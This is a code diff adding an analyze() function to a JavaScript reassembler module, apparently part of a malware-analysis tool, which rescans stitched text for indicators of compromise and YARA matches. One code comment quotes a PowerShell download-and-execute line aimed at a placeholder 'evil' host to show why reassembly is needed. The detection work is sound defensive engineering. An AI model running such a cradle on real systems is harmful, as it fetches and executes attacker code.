@@ -451,8 +451,163 @@
     return text.split(SENTINEL_OPEN).join('');
   }
 
+  // ── Phase 2: re-analyse the reconstructed text ────────────────────────
+  // Running the IOC regex sweep + decoded-payload YARA scan over the
+  // stitched body surfaces signals the per-finding cards could not: a
+  // command line like `iex (New-Object Net.WebClient).DownloadString("http://evil/s2")`
+  // reads like a single IOC from a reassembled script but had its URL
+  // atom (`"http://evil/s2"`) in one finding and its `iex` atom
+  // (`Invoke-Expression`) in another. Neither finding triggers a
+  // DownloadString-style YARA rule on its own; together they do.
+  //
+  // Contract — `analyze(reconstructed, opts)`:
+  //   reconstructed : the `build()` result (needed for the stripped text
+  //                   + reconstructedHash + coverage metadata).
+  //   opts.existingIocs : { urls: Set<string>, ips: Set<string>, hashes: Set<string>, ... }
+  //                   — caller-provided allow-list of IOCs ALREADY in
+  //                   `findings.interestingStrings` + `externalRefs`.
+  //                   Any IOC the reassembly surfaces that is already
+  //                   in this set is NOT considered novel (it has a
+  //                   home in the sidebar already; the point of this
+  //                   call is to surface NEW indicators).
+  //   opts.extractInterestingStringsCore : injected — we cannot require
+  //                   the global here because the reassembler module
+  //                   loads before the sidebar-focus / load chain
+  //                   wires up the canonical `_extractInterestingStrings`
+  //                   shim. Pass `window.extractInterestingStringsCore`
+  //                   or a test stub.
+  //   opts.workerManager : usually `window.WorkerManager`. Must expose
+  //                   `runDecodedYara(payloads, source, opts)` and
+  //                   `workersAvailable()` (falsy → YARA skipped).
+  //   opts.yaraSource  : YARA rule source text (caller calls
+  //                   `app._getAllYaraSource()`). Falsy → YARA skipped.
+  //   opts.vbaModuleSources : forwarded to `extractInterestingStringsCore`
+  //                   so VBA-module regex masking stays consistent with
+  //                   the main-thread call site.
+  //
+  // Returns: Promise resolving to
+  //   {
+  //     novelIocs : Array<IOC>,    // same shape as `extractInterestingStringsCore`
+  //                                // emits; each tagged `_fromReassembly = true`
+  //                                // and `_reconstructedHash = <hash>`.
+  //     yaraHits  : Array<{ ruleName, severity, tags, meta? }>,  // deduped
+  //     scannedBytes : number,     // size of the sentinel-stripped scan buffer
+  //     extractMs    : number,
+  //     yaraMs       : number,
+  //     skipped      : { extract?: string, yara?: string }  // reason strings
+  //   }
+  //
+  // Never throws — every upstream failure collapses into a populated
+  // `skipped` field and an otherwise-empty result. The host site in
+  // `app-load.js` then proceeds with whatever the reassembly pipeline
+  // did manage to produce.
+  async function analyze(reconstructed, opts) {
+    const result = {
+      novelIocs: [],
+      yaraHits: [],
+      scannedBytes: 0,
+      extractMs: 0,
+      yaraMs: 0,
+      skipped: {},
+    };
+    if (!reconstructed || typeof reconstructed.text !== 'string' || reconstructed.text.length === 0) {
+      result.skipped.extract = 'no-reconstruction';
+      result.skipped.yara    = 'no-reconstruction';
+      return result;
+    }
+    const stripped = stripSentinels(reconstructed.text);
+    result.scannedBytes = stripped.length;
+    const hash = reconstructed.reconstructedHash || '';
+
+    // ── IOC re-extract ───────────────────────────────────────────────
+    // Pure, synchronous, ~ms per MiB. We run it first so the YARA dispatch
+    // can piggyback on the same stripped buffer.
+    const extractFn = opts && opts.extractInterestingStringsCore;
+    const existing  = (opts && opts.existingIocs) || null;
+    if (typeof extractFn !== 'function') {
+      result.skipped.extract = 'no-extract-fn';
+    } else {
+      const t0 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
+      try {
+        const vbaModuleSources = (opts && Array.isArray(opts.vbaModuleSources)) ? opts.vbaModuleSources : [];
+        const existingValues = existing && existing.allValues
+          ? Array.from(existing.allValues)
+          : [];
+        const coreOut = extractFn(stripped, { existingValues, vbaModuleSources });
+        const rows = (coreOut && Array.isArray(coreOut.findings)) ? coreOut.findings : [];
+        // Diff against caller's set of known IOC values.
+        for (const row of rows) {
+          if (!row) continue;
+          const v = row.url || row.value;
+          if (!v) continue;
+          if (existing && existing.allValues && existing.allValues.has(v)) continue;
+          // Mark every row the reassembly surfaces so downstream UI /
+          // exporters can flag it as "seen only after stitching". The
+          // source hash lets tests (and future dedupe) match a specific
+          // reassembly invocation.
+          row._fromReassembly     = true;
+          row._reconstructedHash  = hash;
+          result.novelIocs.push(row);
+        }
+      } catch (_extractErr) {
+        result.skipped.extract = 'extract-threw';
+      }
+      const t1 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
+      result.extractMs = Math.max(0, t1 - t0);
+    }
+
+    // ── Decoded-payload YARA scan ─────────────────────────────────────
+    // One payload (the stripped reconstructed body) under the
+    // `decoded-payload` formatTag. Mirrors `DecodedYaraFilter`'s
+    // worker-availability gate — a main-thread YARA engine on a
+    // multi-MiB buffer would freeze the UI.
+    const wm = opts && opts.workerManager;
+    const yaraSource = opts && opts.yaraSource;
+    if (!wm || typeof wm.runDecodedYara !== 'function') {
+      result.skipped.yara = 'no-worker-manager';
+    } else if (typeof wm.workersAvailable === 'function' && !wm.workersAvailable()) {
+      result.skipped.yara = 'workers-unavailable';
+    } else if (!yaraSource || typeof yaraSource !== 'string') {
+      result.skipped.yara = 'no-yara-source';
+    } else if (stripped.length === 0) {
+      result.skipped.yara = 'empty-payload';
+    } else {
+      const t0 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
+      try {
+        const bytes = new TextEncoder().encode(stripped);
+        const out = await wm.runDecodedYara(
+          [{ id: 0, bytes }],
+          yaraSource,
+          { formatTag: 'decoded-payload' },
+        );
+        if (out && Array.isArray(out.hits)) {
+          const seen = new Set();
+          for (const h of out.hits) {
+            for (const r of (h.results || [])) {
+              if (!r || !r.ruleName || seen.has(r.ruleName)) continue;
+              seen.add(r.ruleName);
+              result.yaraHits.push({
+                ruleName: r.ruleName,
+                severity: (r.meta && r.meta.severity) || null,
+                tags:     r.tags || '',
+                description: (r.meta && r.meta.description) || '',
+              });
+            }
+          }
+        }
+      } catch (_yaraErr) {
+        result.skipped.yara = 'yara-threw';
+      }
+      const t1 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
+      result.yaraMs = Math.max(0, t1 - t0);
+    }
+
+    return result;
+  }
+
   window.EncodedReassembler = {
     build,
+    analyze,
     mapReconToSource,
     stripSentinels,
     // Exposed for unit tests and the sidebar UI layer.
